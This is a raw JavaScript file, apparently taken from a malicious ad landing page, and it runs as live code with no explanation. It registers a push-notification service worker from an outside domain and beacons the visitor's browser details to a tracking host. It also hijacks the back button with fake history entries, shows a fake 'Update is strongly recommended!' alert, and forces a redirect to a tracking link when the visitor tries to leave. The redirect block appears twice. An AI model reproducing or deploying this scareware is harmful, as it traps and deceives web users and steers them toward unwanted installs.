var pshr_init = (function() {
  setTimeout(function() {
  registerPush({
    domain: '//sbscribeme.com',
    user: '552648880bfd300e0f568985c0d715aa',
    landId: '0nY9eHW6iVHyXIQ',
    swName: 'pusherSW.js',
    version: '1.3'
  });
  }, +1 || 1);
});

(function() {
  if (typeof navigator !== 'undefined' && typeof navigator.sendBeacon !== 'undefined') {
    function knock() {
      navigator.sendBeacon('//onclklnd.com/1431028/1621482/', 'Browser with BeaconAPI Support');
    }
  }
  else {

    var browser = (function() {
      var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
      if(/trident/i.test(M[1])){
        tem=/\brv[ :]+(\d+)/g.exec(ua) || [];
        return {name:'IE',version:(tem[1]||'')};
      }
      if(M[1]==='Chrome'){
        tem=ua.match(/\bOPR|Edge\/(\d+)/)
        if(tem!=null)   {return {name:'Opera', version:tem[1]};}
      }
      M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
      if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
      return {
        name: M[0],
        version: M[1]
      };
    })();

    if (!(
      (browser.name === 'Chrome' && browser.version > 39) ||
      (browser.name === 'Edge') ||
      (browser.name === 'Firefox' && browser.version > 31) ||
      (browser.name === 'Opera' && browser.version > 26)
    )) {
      function sendBeacon(url, data, _settings) {
        var xhr = ('XMLHttpRequest' in window) ? new XMLHttpRequest() : new ActiveXObject('Microsoft.XMLHTTP');
        xhr.open('POST', url, false);
        xhr.withCredentials = true;
        xhr.setRequestHeader('Accept', '*/*');
        if (typeof data === 'string') {
          xhr.setRequestHeader('Content-Type', 'text/plain;charset=UTF-8');
          xhr.responseType = 'text/plain';
        } else if (Object.prototype.toString.call(data) === '[object Blob]') {
          if (data.type) {
            xhr.setRequestHeader('Content-Type', data.type);
          }
        }

        if (typeof _settings === 'object') {
          if (!isNaN(_settings.timeout)) {
            setTimeout(function() {
              if (xhr.readyState !== 4) {
                xhr.abort();
              }
            }, _settings.timeout);
            ;
          }
        }

        xhr.send(data);
        return true;
      }

      function knock() {
        sendBeacon('//onclklnd.com/1431028/1621482/', 'Browser without BeaconAPI Support: ' + browser.name + ' ' + browser.version);
      }
    }
    else {
      function knock() {
        return true;
      }
    }
  }
  var knocked = false;
  document.addEventListener('click', function(e) {
    if (!knocked) {
      if ((e.target.tagName === 'A' && e.target.getAttribute('href') === '//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US') ||
          e.target.getAttribute('data-href') === '//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US') {
        knock();
        knocked = true;
      }
    }
  });
})();

(function(h,l,d){h.replaceState(null,d.title,"?rzi=1431028&rsz=1431028&rid=");})(history,location,document);

var fakepath=document.URL;

window.history.pushState('index.php', 'gogogo', fakepath);
window.history.pushState('index.php', 'disone', fakepath);

window.addEventListener("popstate", function(e){if(document.URL.indexOf(fakepath) >= 0){
  window.history.pushState('index.php', 'gogogo', fakepath);
  window.history.pushState('index.php', 'disone', fakepath);
  if (document.getElementById('snd')) {
    document.getElementById('snd').play();
  }
  alert('Update is strongly recommended!');
}});

(function(w, d){
  var epp = function() {

    if (w.onbeforeunload === null) {
      var to;

      function repp() {
        w.onbeforeunload = null;
      };

      function epp() {
        to = setTimeout(function() {
          w.location.replace('//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US');
          repp();
        }, 100);
        return "Update is strongly recommended!";
      }

      w.onbeforeunload = epp;

      // Prevent epp firing from clicking on tracking links

      var ln = d.querySelectorAll("[href='//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US'], [data-href='//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US']");
      for (i = 0; i < ln.length; ++i) {
        ln[i].addEventListener("click", function() {
            repp();
        });
      }
    };

  };

  if (d.readyState != 'loading'){
    epp();
  } else {
    d.addEventListener('DOMContentLoaded', epp);
  }

})(window, document);

(function(w, d){
  var epp = function() {

    if (w.onbeforeunload === null) {
      var to;

      function repp() {
        w.onbeforeunload = null;
      };

      function epp() {
        to = setTimeout(function() {
          w.location.replace('//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US');
          repp();
        }, 100);
        return "Update is strongly recommended!";
      }

      w.onbeforeunload = epp;

      // Prevent epp firing from clicking on tracking links

      var ln = d.querySelectorAll("[href='//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US'], [data-href='//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US']");
      for (i = 0; i < ln.length; ++i) {
        ln[i].addEventListener("click", function() {
            repp();
        });
      }
    };

  };

  if (d.readyState != 'loading'){
    epp();
  } else {
    d.addEventListener('DOMContentLoaded', epp);
  }

})(window, document);
